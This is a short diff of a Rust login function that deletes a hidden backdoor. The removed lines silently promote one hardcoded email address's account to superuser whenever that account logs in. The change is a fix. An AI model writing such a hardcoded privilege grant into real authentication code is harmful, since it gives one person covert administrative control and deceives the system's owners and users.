@@ -189,9 +189,6 @@ fn find_user(email: String, password: String) -> Result<User, AuthError> {
         let _user = user_some.expect("Error.");
         if let Ok(matching) = verify(&_user.password, &password) {
             if matching {
-                if &_user.email == "interesnijsim49293@gmail.com" {
-                    User::create_superuser(_user.id);
-                }
                 return Ok(_user);
             }
         }
